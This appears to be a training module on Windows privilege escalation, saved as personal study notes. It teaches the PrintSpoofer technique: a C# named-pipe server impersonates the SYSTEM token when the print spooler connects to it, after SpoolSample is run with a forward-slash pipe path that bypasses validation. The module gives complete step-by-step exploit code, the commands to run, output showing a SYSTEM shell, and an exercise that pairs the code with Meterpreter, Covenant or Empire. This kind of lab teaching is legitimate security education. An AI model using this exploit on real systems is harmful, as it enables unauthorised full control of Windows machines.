In the previous section, we discussed how the privileges of an access token decide the access rights of an authenticated user. Now let's discuss how we can leverage certain privileges for escalation.

In the past, security researchers have [identified](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/) nine different privileges that may allow for privilege escalation from medium integrity to either high integrity or system integrity, or enable compromise of processes running as another authenticated user.

Explaining all nine privileges in-depth and how they may be used to escalate privileges is beyond the scope of this module, but we'll focus on _SeImpersonatePrivilege_.

_SeImpersonatePrivilege_ allows us to impersonate any token for which we can get a reference, or [_handle_](https://en.wikipedia.org/wiki/Handle_\(computing\)). This privilege is quite interesting since the built-in _Network Service_ account, the [_LocalService_](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account) account, and the default IIS account have it assigned by default. Because of this, gaining code execution on a web server will often give us access to this privilege and potentially offer the possibility to escalate our access.

If we have the _SeImpersonatePrivilege_ privilege we can often use the Win32 [_DuplicateTokenEx_](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex) API to create a primary token from an impersonation token and create a new process in the context of the impersonated user.

When no tokens related to other user accounts are available in memory, we can likely force the SYSTEM account to give us a token that we can impersonate.

To leverage the _SeImpersonatePrivilege_ privilege, in this section we are going to use a [post exploitation attack](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) that relies on Windows [_pipes_](https://docs.microsoft.com/en-us/windows/win32/ipc/pipes).

Pipes are a means of [_interprocess communication_](https://docs.microsoft.com/en-us/windows/win32/ipc/interprocess-communications) (IPC), just like RPC, COM, or even network sockets.

A pipe is a section of shared memory inside the kernel that processes can use for communication. One process can create a pipe (the pipe server) while other processes can connect to the pipe (pipe clients) and read/write information from/to it, depending on the configured access rights for a given pipe.

[_Anonymous_](https://docs.microsoft.com/en-us/windows/win32/ipc/anonymous-pipes) pipes are typically used for communication between parent and child processes, while [_named_](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) pipes are more broadly used. In our examples we'll make use of named pipes, because they have more functionality and more importantly, they support impersonation.

The attack that we are going to simulate (based on a technique developed by the security researcher [Lee Christensen](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)) can force the SYSTEM account to connect to a named pipe set up by an attacker.

While the technique was originally developed as part of an Active Directory attack, it can also be used locally. It is based on the [print spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc), which is started by default and runs in a SYSTEM context.

We'll discuss the technique in more detail later. For now, it's important to understand that the attack is based on the fact that the print spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes. If we can create a process running with the _SeImpersonatePrivilege_ privilege that simulates a print client, we will obtain a SYSTEM token that we can impersonate.

To demonstrate this, let's create a C# application that creates a pipe server (i.e. a "print client"), waits for a connection, and attempts to impersonate the client that connects to it.

The first key component of this attack is the [_ImpersonateNamedPipeClient_](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient) API, which allows impersonation of the token from the account that connects to the pipe if the server has _SeImpersonatePrivilege_. When _ImpersonateNamedPipeClient_ is called, the calling thread will use the impersonated token instead of its default token.

In order to create our first proof of concept, we'll have to use the Win32 [_CreateNamedPipe_](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea), [_ConnectNamedPipe_](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe), and _ImpersonateNamedPipeClient_ APIs.

As the name suggests, _CreateNamedPipe_ creates a pipe. Its function prototype is shown in Listing 17.

```
HANDLE CreateNamedPipeA(
  LPCSTR                lpName,
  DWORD                 dwOpenMode,
  DWORD                 dwPipeMode,
  DWORD                 nMaxInstances,
  DWORD                 nOutBufferSize,
  DWORD                 nInBufferSize,
  DWORD                 nDefaultTimeOut,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes
);
```

> Listing 17 - CreateNamedPipe function prototype

This API accepts a number of relatively simple arguments. The first, and most important, is the pipe name (_lpName_). All named pipes must have a standardized name format (such as **\\.\pipe\pipename**) and must be unique on the system.

The second argument (_dwOpenMode_) describes the mode the pipe is opened in. We'll specify a bi-directional pipe with the _PIPE_ACCESS_DUPLEX_ enum using its numerical equivalent of "3". The third argument (_dwPipeMode_) describes the mode the pipe operates in. We'll specify _PIPE_TYPE_BYTE_ to directly write and read bytes along with _PIPE_WAIT_ to enable blocking mode. This will allow us to listen on the pipe until it receives a connection. We'll specify the combination of these two modes with the numerical value "0".

The maximum number of instances for the pipe is specified through _nMaxInstances_. This is primarily used to ensure efficiency in larger applications, and any value between 1 and 255 works for us. _nOutBufferSize_ and _nInBufferSize_ define the number of bytes to use for the input and output buffer. We'll choose one memory page (0x1000 bytes).

The second-to-last argument defines the default time-out value that is used with the [_WaitNamedPipe_](https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-waitnamedpipea) API. Since we are using a blocking named pipe, we don't care about this and can choose the default value of 0. For the last argument, we must submit a SID detailing which clients can interact with the pipe. We'll set this to NULL to allow the SYSTEM and local administrators to access it.

At this point, we will create a new Visual Studio solution and insert the P/Invoke DllImport statement along with the call to _CreateNamedPipe_:

```
using System;
using System.Runtime.InteropServices;

namespace PrintSpooferNet
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
                return;
            }
            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
        }
    }
}
```

> Listing 18 - Code to import and call CreateNamedPipe

This code expects the pipe name to be passed on the command line.

Next, we must invoke _ConnectNamedPipe_. The function prototype is shown in Listing 19.

```
BOOL ConnectNamedPipe(
  HANDLE       hNamedPipe,
  LPOVERLAPPED lpOverlapped
);
```

> Listing 19 - ConnectNamedPipe function prototype

The first argument (_hNamedPipe_) is a handle to the pipe that is returned by _CreateNamedPipe_ and the second (_lpOverlapped_) is a pointer to a structure used in more advanced cases. In our case, we'll simply set this to NULL.

The code addition required to import and call _ConnectNamedPipe_ is shown in Listing 20.

```
[DllImport("kernel32.dll")]
static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
...
ConnectNamedPipe(hPipe, IntPtr.Zero);
```

> Listing 20 - Code to import and call ConnectNamedPipe

After we have called _ConnectNamedPipe_, the application will wait for any incoming pipe client. Once a connection is made, we'll call _ImpersonateNamedPipeClient_ to impersonate the client.

_ImpersonateNamedPipeClient_ accepts the pipe handle as its only argument per its function prototype as shown in Listing 21.

```
BOOL ImpersonateNamedPipeClient(
  HANDLE hNamedPipe
);
```

> Listing 21 - ImpersonateNamedPipeClient function prototype

The rather simple code additions importing and calling _ImpersonateNamedPipeClient_ are shown in Listing 22.

```
[DllImport("Advapi32.dll")]
static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
...
ImpersonateNamedPipeClient(hPipe);
```

> Listing 22 - Code to import and call ImpersonateNamedPipeClient

At this point, our code will start a pipe server, listen for incoming connections, and impersonate them.

If everything works correctly, _ImpersonateNamedPipeClient_ will assign the impersonated token to the current thread, but we have no way of confirming this in our current application.

To verify the success of our attack, we can open the impersonated token with [_OpenThreadToken_](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken) and then use [_GetTokenInformation_](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) to obtain the SID associated with the token. Finally, we can call [_ConvertSidToStringSid_](https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertsidtostringsidw) to convert the SID to a readable SID string.

While this confirmation does not have to be part of our final exploit, it helps us understand the attack. Let's add these APIs to our code.

The function prototype for _OpenThreadToken_ is shown in Listing 23.

```
BOOL OpenThreadToken(
  HANDLE  ThreadHandle,
  DWORD   DesiredAccess,
  BOOL    OpenAsSelf,
  PHANDLE TokenHandle
);
```

> Listing 23 - OpenThreadToken function prototype

First we must supply a handle to the thread (_ThreadHandle_) associated with this token. Since the thread in question is the current thread, we'll use the Win32 [_GetCurrentThread_](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread) API, which does not require any arguments and simply returns the handle.

Next we must specify the level of access (_DesiredAccess_) we want to the token. To avoid any issues, we'll ask for all permissions ([_TOKEN_ALL_ACCESS_](https://docs.microsoft.com/en-gb/windows/win32/secauthz/access-rights-for-access-token-objects)) with its numerical value of 0xF01FF.

_OpenAsSelf_ specifies whether the API should use the security context of the process or the thread. Since we want to use the impersonated token, we'll set this to false.

Finally, we must supply a pointer (_TokenHandle_), which will be populated with a handle to the token that is opened. Code additions are shown in Listing 24.

```
[DllImport("kernel32.dll")]
private static extern IntPtr GetCurrentThread();

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
...
IntPtr hToken;
OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
```

> Listing 24 - Code additions to call OpenThreadToken

Next, we'll invoke _GetTokenInformation_. This API can return a variety of information, but we'll simply request the SID. The function prototype is shown in Listing 25.

```
BOOL GetTokenInformation(
  HANDLE                  TokenHandle,
  TOKEN_INFORMATION_CLASS TokenInformationClass,
  LPVOID                  TokenInformation,
  DWORD                   TokenInformationLength,
  PDWORD                  ReturnLength
);
```

> Listing 25 - GetTokenInformation function prototype

The first argument (_TokenHandle_) is the token we obtained from _OpenThreadToken_, and the second argument (_TokenInformationClass_) specifies the type of information we want to obtain.

[_TOKEN_INFORMATION_CLASS_](https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_information_class) is an enum that contains values specifying the type of information we can retrieve from an access token via _GetTokenInformation_. Since we simply want the SID, we can pass _TokenUser_, which has the numerical value of "1", for the _TOKEN_INFORMATION_CLASS_ argument.

_TokenInformation_ is a pointer to the output buffer that will be populated by the API and _TokenInformationLength_ is the size of the output buffer. Since we don't know the required size of the buffer, the recommended way of using the API is to call it twice. The first time, we set these two arguments values to NULL and 0 respectively and then _ReturnLength_ will be populated with the required size.

After this, we can allocate an appropriate buffer and call the API a second time. The require code updates are shown in Listing 26.

```
[DllImport("advapi32.dll", SetLastError = true)]
static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
...
int TokenInfLength = 0;
GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
```

> Listing 26 - Code additions to call GetTokenInformation

To allocate the TokenInformation buffer, we'll use the .NET [_Marshal.AllocHGlobal_](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.allochglobal?view=netcore-3.1) method, which can allocate unmanaged memory.

As the final step, we'll use _ConvertSidToStringSid_ to convert the binary SID to a SID string that we can read. The function prototype of _ConvertSidToStringSid_ is shown in Listing 27.

```
BOOL ConvertSidToStringSidW(
  PSID   Sid,
  LPWSTR *StringSid
);
```

> Listing 27 - ConvertSidToStringSid function prototype

The first argument (_Sid_) is a pointer to the SID. The SID is in the output buffer that was populated by _GetTokenInformation_, but we must extract it first.

One way to do this is to define the [_TOKEN_USER_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/ns-ntifs-_token_user) structure (which is part of the _TOKEN_INFORMATION_CLASS_ used by _GetTokenInformation_) and then marshal a pointer to it with [_Marshal.PtrToStructure_](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostructure?view=netcore-3.1).

For the last argument (_*StringSid_), we'll supply the output string. Here we can simply supply an empty pointer and once it gets populated, marshal it to a C# string with [_Marshal.PtrToStringAuto_](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.ptrtostringauto?view=netcore-3.1).

The required structures, import, and added code are shown in Listing 28.

```
 [StructLayout(LayoutKind.Sequential)]
public struct SID_AND_ATTRIBUTES
{
    public IntPtr Sid;
    public int Attributes;
}

public struct TOKEN_USER
{
    public SID_AND_ATTRIBUTES User;
}
...
[DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
...
TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
IntPtr pstr = IntPtr.Zero;
Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
string sidstr = Marshal.PtrToStringAuto(pstr);
Console.WriteLine(@"Found sid {0}", sidstr);
```

> Listing 28 - Code additions to call ConvertSidToStringSid

At the end of Listing 28, we print the SID associated with the token to the console, showing which user we impersonated.

Now we have finally written all the code we need to start our test and better understand the use of named pipes for impersonation and privilege escalation.

As previously mentioned, we must execute the code in the context of a user account that has the _SeImpersonatePrivilege_ access right. For our attack demonstration, we'll log in to appsrv01 as the domain user _admin_ and use PsExec to open a command prompt as the built-in _Network Service_ account as shown in Listing 29.

```
C:\Tools\SysInternalsSuite> psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com
```

> Listing 29 - Opening a command prompt as Network Service

Before we execute our application, we can verify the user and the presence of _SeImpersonatePrivilege_ in the new command prompt:

```
C:\Tools> whoami
nt authority\network service

C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

> Listing 30 - User and privileges

Now we can compile our assembled code and transfer it to appsrv01.

Next, we execute it and supply a random pipe name as shown in Listing 31.

```
C:\Tools>PrintSpooferNet.exe \\.\pipe\test
```

> Listing 31 - Starting the pipe server

To simulate a connection, we can open an elevated command prompt and write to the pipe as shown in Listing 32.

```
C:\Users\Administrator> echo hello > \\localhost\pipe\test
```

> Listing 32 - Writing to the pipe

When we switch back to the command prompt running our application, we find that a SID has been printed:

```
C:\Tools> PrintSpooferNet.exe \\.\pipe\test
Found sid S-1-5-21-1587569303-1110564223-1586047116-500
```

> Listing 33 - SID of built in administrator

Our code has impersonated a token and resolved the associated SID.

To verify that this SID belongs to the administrator account, we can switch back to the elevated command prompt and dump it as shown in Listing 34.

```
C:\Users\Administrator> whoami /user

USER INFORMATION
----------------

User Name           SID
=================== =============================================
corp1\administrator S-1-5-21-1587569303-1110564223-1586047116-500
```

> Listing 34 - Dumping SID with whoami

This proves that we have indeed impersonated the built-in domain administrator account. More importantly, we can impersonate anyone who connects to our named pipe.

It's now time to test our application leveraging the print spooler service. Communication to the spooler service is done through [_Print System Remote Protocol_](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) (MS-RPRN), which dates back to 2007 and is not well documented. Fortunately for us, the MS-RPRN works through named pipes and the pipe name used by the print spooler service is **\pipe\spoolss**.

The potential for abuse comes from the [_RpcOpenPrinter_](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f) and [_RpcRemoteFindFirstPrinterChangeNotification_](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/b8b414d9-f1cd-4191-bb6b-87d09ab2fd83) functions. _RpcOpenPrinter_ allows us to retrieve a handle for the printer server, which is used as an argument to the second API.

_RpcRemoteFindFirstPrinterChangeNotification_ essentially monitors printer object changes and sends change notifications to print clients.

Once again, this change notification requires the print spooler to access the print client. If we ensure that the print client is our named pipe, it will obtain a SYSTEM token that we can impersonate.

Sadly, unlike regular Win32 APIs, MS-RPRN APIs can not be called directly. Print spooler functionality resides in the unmanaged **RpcRT4.dll** library and is called through the proxy function [_NdrClientCall2_](https://docs.microsoft.com/en-us/windows/win32/api/rpcndr/nf-rpcndr-ndrclientcall2), which uses a binary format to pass and invoke underlying functions. The implementation of these calls are beyond the scope of this module.

Luckily, we can use the _SpoolSample_ C# implementation written by [Lee Christensen](https://github.com/leechristensen/SpoolSample) or the PowerShell code written by [Vincent Le Toux](https://github.com/vletoux/SpoolerScanner). A compiled version of SpoolSample is located in the **C:\Tools** folder of appsrv01.

<div class="red-banner">
  <em>The SpoolSample application and the entire printer bug technique was developed to be used in an Active Directory setting and was not specifically designed for local privilege escalation.</em>
</div>
When we use SpoolSample, we must specify the name of the server to connect to (the victim) and the name of the server we control (the attacker), also called the capture server. Since we are performing the attack locally, both servers are the same. This presents a challenge.

The print spooler service (running as SYSTEM on the victim) needs to contact the simulated print client (through our pipe) but since they are on the same host, they in effect require the same default pipe name (**pipe\spoolss**). Because of this, we cannot create the named pipe with the required name easily.

In order to find a solution, we first must understand the problem in detail. To do this, we will monitor the target system with Process Monitor from SysInternals while executing **SpoolSample.exe** against an arbitrary pipe name.Process Monitor is located in the **C:\Tools\SysInternals** folder.

First, we'll configure a capture filter with _Filter_ > _Filter_ and select _Process Name_ from the dropdown menu, setting this to "spoolsv.exe" to filter for print spooler events. We'll then click _Add_ followed by _Apply_ and exit the filter menu by selecting _OK_.

Then, we'll execute **SpoolSample.exe** and specify the current hostname followed by an arbitrary pipe name as shown in Listing 35.

```
C:\Tools> SpoolSample.exe appsrv01 appsrv01\test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\appsrv01, CaptureServer: \\appsrv01\test
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```

> Listing 35 - Invoking SpoolSample with arbitrary pipe name

Although the application output indicates that a printer notification callback was configured, Process Monitor shows that no access to the arbitrary pipe name has occurred as displayed in Figure 2.

![Figure 2: No connections from spoolss](https://static.offsec.com/offsec-courses/PEN-300/imgs/wc/cc9d3e293ef7be7cc4733b279e6c70f7-wc_pipe_procmon1.png)

Figure 2: No connections from spoolss

This is because, before attempting to access the client pipe, the print spooler service validates the pipe path, making sure it matches the default name "pipe\spoolss". Our arbitrary pipe "test" fails this validation and, consequently, the print spooler service doesn't even attempt to connect to the client. This is why we don't see any successful nor failed attempt in Process Monitor. Unfortunately, as mentioned before, we cannot specify "spoolss" as a name since it is already in use by the print spooler service we are targeting.

At this point, it is useful to know what happens when a file path is supplied to a Win32 API. When directory separators are used as a part of the file path, they are converted to canonical form. Specifically, forward slashes ("/") will be converted to backward slashes ("\"). This is also known as file path [normalization](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats).

Interestingly enough, the security researcher @jonaslyk discovered that if we provide SpoolSample with an arbitrary pipe name containing a forward slash after the hostname ("appsrv01/test"), the spooler service will not interpret it correctly and it will append the default name "pipe\spoolss" to our own path before processing it. This effectively bypasses the path validation and the resulting path ("appsrv01/test\pipe\spoolss") is then normalized before the spooler service attempts to send a print object change notification message to the client.

This obviously can help us because this pipe name differs from the default one used by the print spooler service, and we can register it in order to simulate a print client.

To verify this, we can repeat our last example but this time supplying an arbitrary pipe name that contains a forward slash in the print client name:

```
C:\Tools> SpoolSample.exe appsrv01 appsrv01/test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\appsrv01, CaptureServer: \\appsrv01/test
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1707 - The network address is invalid.
```

> Listing 36 - Invoking SpoolSample with forward slash

We receive an error and Process Monitor confirms the theory (Figure 3).

![Figure 3: Path canonicalized and attempted access](https://static.offsec.com/offsec-courses/PEN-300/imgs/wc/aa65ea14ba18df472ecd888b8a035fe9-wc_pipe_procmon2.png)

Figure 3: Path canonicalized and attempted access

First, the path we supplied (**appsrv01/test**) has been switched to a canonical form (**appsrv01\test**) as part of the full path.

Second, **spoolsv.exe** attempted to access the named pipe **\\.\appsrv01\test\pipe\spoolss** while performing the callback. Since we have not created a pipe server by that name yet, the request failed.

At this point, we just need to create a pipe server with that name and simulate a print client. When we execute SpoolSample, the print spooler service will connect to our pipe.

To do this, we'll open another command prompt and launch our PrintSpooferNet application. Recall that we are launching our application from a _Network Service_ command prompt because we are demonstrating a scenario where we have exploited a process that has the _SeImpersonatePrivilege_, and we are trying to escalate to SYSTEM.

```
C:\Tools> PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
```

> Listing 37 - Creating the pipe server

Now we'll invoke SpoolSample to trigger the change notification against the capture server (appsrv01/pipe/test) as shown in Listing 38.

```
C:\Tools> SpoolSample.exe appsrv01 appsrv01/pipe/test
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\appsrv01, CaptureServer: \\appsrv01/pipe/test
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

> Listing 38 - Invoking SpoolSample again the pipe server

Our application reveals a connection from the "S-1-5-18" SID :

```
C:\Tools>PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
Found sid S-1-5-18
```

> Listing 39 - Invoking SpoolSample with forward slash

This SID value belongs to the [SYSTEM account](https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids) proving that our technique worked. Excellent!

We now have a way of forcing the SYSTEM account to authenticate to our named pipe, which allows us to impersonate it. To complete this attack, we must now take advantage of the impersonated token, which we will do by launching a new command prompt as SYSTEM.

The Win32 [_CreateProcessWithTokenW_](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) API can create a new process based on a token. The token must be a primary token, so we'll first use _DuplicateTokenEx_ to convert the impersonation token to a primary token.

The function prototype for _DuplicateTokenEx_ is shown in Listing 40.

```
BOOL DuplicateTokenEx(
  HANDLE                       hExistingToken,
  DWORD                        dwDesiredAccess,
  LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
  TOKEN_TYPE                   TokenType,
  PHANDLE                      phNewToken
);
```

> Listing 40 - DuplicateTokenEx function prototype

First, we'll supply the impersonation token by recovering it with _OpenThreadToken_. We'll request full access to the token with the numerical value 0xF01FF for the _dwDesiredAccess_ argument. For the third argument (_lpTokenAttributes_), we'll use a default security descriptor for the new token by setting this to NULL.

_ImpersonationLevel_ must be set to [_SecurityImpersonation_](https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-security_impersonation_level), which is the access type we currently have to the token. This has a numerical value of "2". For the _TokenType_, we'll specify a primary token ([_TokenPrimary_](https://docs.microsoft.com/en-gb/windows/win32/api/winnt/ne-winnt-token_type)) by setting this to "1".

The final argument (_phNewToken_) is a pointer that will be populated with the handle to the duplicated token. The code additions are shown in Listing 41.

```
[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
...
IntPtr hSystemToken = IntPtr.Zero;
DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
```

> Listing 41 - Code additions to call DuplicateTokenEx

With the token duplicated as a primary token, we can call _CreateProcessWithToken_ to create a command prompt as SYSTEM.

Listing 42 lists the function prototype for _CreateProcessWithToken_.

```
BOOL CreateProcessWithTokenW(
  HANDLE                hToken,
  DWORD                 dwLogonFlags,
  LPCWSTR               lpApplicationName,
  LPWSTR                lpCommandLine,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCWSTR               lpCurrentDirectory,
  LPSTARTUPINFOW        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

> Listing 42 - CreateProcessWithToken function prototype

First, we'll supply the newly duplicated token followed by a logon option, which we set to its default of 0. For the third (_lpApplicationName_) and fourth (_lpCommandLine_) arguments, we'll supply NULL and the full path of **cmd.exe**, respectively.

The creation flags (_dwCreationFlags_), environment block (_lpEnvironment_), and current directory (_lpCurrentDirectory_) arguments can be set to 0, NULL, and NULL respectively to select the default options.

For the two last arguments (_lpStartupInfo_ and _lpProcessInformation_), we must pass [_STARTUPINFO_](https://docs.microsoft.com/en-gb/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) and [_PROCESS_INFORMATION_](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information) structures, which are populated by the API during execution. Neither of these are defined in P/invoke imports so we must define them ourselves as shown in the following code:

```
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public int dwProcessId;
    public int dwThreadId;
}

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct STARTUPINFO
{
    public Int32 cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public Int32 dwX;
    public Int32 dwY;
    public Int32 dwXSize;
    public Int32 dwYSize;
    public Int32 dwXCountChars;
    public Int32 dwYCountChars;
    public Int32 dwFillAttribute;
    public Int32 dwFlags;
    public Int16 wShowWindow;
    public Int16 cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput;
    public IntPtr hStdOutput;
    public IntPtr hStdError;
}
[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
...
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
STARTUPINFO si = new STARTUPINFO();
si.cb = Marshal.SizeOf(si);
CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
```

> Listing 43 - Code additions to call CreateProcessWithTokenW

With all the code written, we'll compile and transfer it to the Windows Server 2019 machine. We'll execute this just as before, by first launching our application to create the pipe server with the name "\\.\appsrv01\test\pipe\spoolss".

Next, we'll launch SpoolSample with the capture server set to "\\appsrv01/pipe/test", which will force the SYSTEM account to connect to our named pipe and a new command prompt is opened.

When we interact with it and display the user, we find it to be SYSTEM:

```
C:\Windows\system32> whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ========
nt authority\system S-1-5-18
```

> Listing 44 - System command prompt

With this attack, we can elevate our privileges from an unprivileged account that has the _SeImpersonatePrivilege_ to SYSTEM on any modern Windows system including Windows 2019 and the newest versions of Windows 10. Nice!

<div class="red-banner">
  <em>A C++ implementation of this attack that has the SpoolSample functionality embedded is available by the researcher [who discovered the technique](https://github.com/itm4n/PrintSpoofer).</em>
</div>

Most native and third-party services that do not require administrative permissions run as Network Service or Local Service, partly due to Microsoft's recommendation. This attack technique means that compromising an unprivileged service is just as valuable as a SYSTEM service.

The technique shown in this section is not the only possible way of leveraging impersonation to obtain SYSTEM integrity. A similar technique that also uses pipes has been discovered by Alex Ionescu and [Yarden Shafir](https://windows-internals.com/faxing-your-way-to-system/). It impersonates the [_RPC system service_](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787851\(v=ws.10\)?redirectedfrom=MSDN) (RpcSs), which typically contains SYSTEM tokens that can be stolen. Note that this technique only works for _Network Service_.

On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains SYSTEM integrity through a local man-in-the-middle attack through [_COM_](https://docs.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal). It is blocked on Windows 10 version 1809 and newer along with Windows Server 2019, which inspired the release of the [_RoguePotato_](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/) tool, expanding this technique to provide access to the RpcSs service and subsequently SYSTEM integrity access.

Lastly, the [_beans_](https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/) technique based on local man-in-the-middle authentication with [_Windows Remote Management_](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (WinRM) also yields SYSTEM integrity access. The caveat of this technique is that it only works on Windows clients, not servers, by default.

In the next section, we'll demonstrate how to impersonate tokens from other authenticated users instead of simply advancing straight to SYSTEM.

#### Exercises

1. Combine the code and verify the token impersonation.
![](Pasted%20image%2020260117012947.png)

![](Pasted%20image%2020260117013519.png)

## get shall as system
![](Pasted%20image%2020260117022714.png)


2. Use the C# code and combine it with previous tradecraft to obtain a Meterpreter, Covenant, or Empire SYSTEM shell.


3. Try to use the attack in the context of _Local Service_ instead of _Network Service_.
![](Pasted%20image%2020260117020213.png)